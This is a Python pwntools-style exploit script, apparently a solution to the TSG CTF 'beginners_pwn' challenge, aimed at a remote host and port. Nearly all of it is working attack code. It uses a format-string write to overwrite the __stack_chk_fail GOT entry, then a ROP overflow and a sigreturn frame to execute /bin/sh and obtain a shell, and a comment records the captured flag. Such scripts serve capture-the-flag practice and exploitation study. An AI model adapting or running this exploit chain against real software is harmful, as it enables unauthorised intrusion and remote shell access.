#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './beginners_pwn'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'35.221.81.216', 'port':30002})
env.select()

#==========

binf = ELF(bin_file)
addr_got_stack_chk  = binf.got['__stack_chk_fail']
addr_bss            = binf.sep_section['.bss']
addr_readn          = binf.sep_function['readn']
addr_syscall        = 0x40118f

#==========

def attack(conn, **kwargs):
    exploit  = b'%7$s%1$s'
    exploit += p64(addr_got_stack_chk)
    sleep(0.5)
    conn.sendline(exploit)

    rop = ROP(binf)
    got  = p64(rop.ret.address) 
    got += p64(0xdeadbeef) 
    got += p64(rop.rdi.address) 
    conn.sendline(got)

    x  = p32(int(constants.SYS_rt_sigreturn))
    x  = x.ljust(0x10, b'\x00')
    x += p32(0x100)
    x += b'/bin/sh'

    exploit  = b'a'*0x10
    exploit += p64(addr_bss+0x1c)

    exploit += p64(rop.rdi.address)
    exploit += p64(addr_bss)
    exploit += p64(rop.rsi.address)
    exploit += p64(len(x)+1)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_readn)

    exploit += p64(addr_readn+0x7a)

    exploit += p64(addr_syscall)

    frame = SigreturnFrame()
    frame.rax = int(constants.SYS_execve)
    frame.rdi = addr_bss + 0x14
    frame.rip = addr_syscall

    sleep(0.5)
    conn.sendline(exploit + bytes(frame))
    sleep(0.5)
    conn.sendline(x)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # TSGCTF{w3lc0m3_70_756c7f2_60_4h34d_pwnpwn~}

if __name__=='__main__':
    main()

#==========
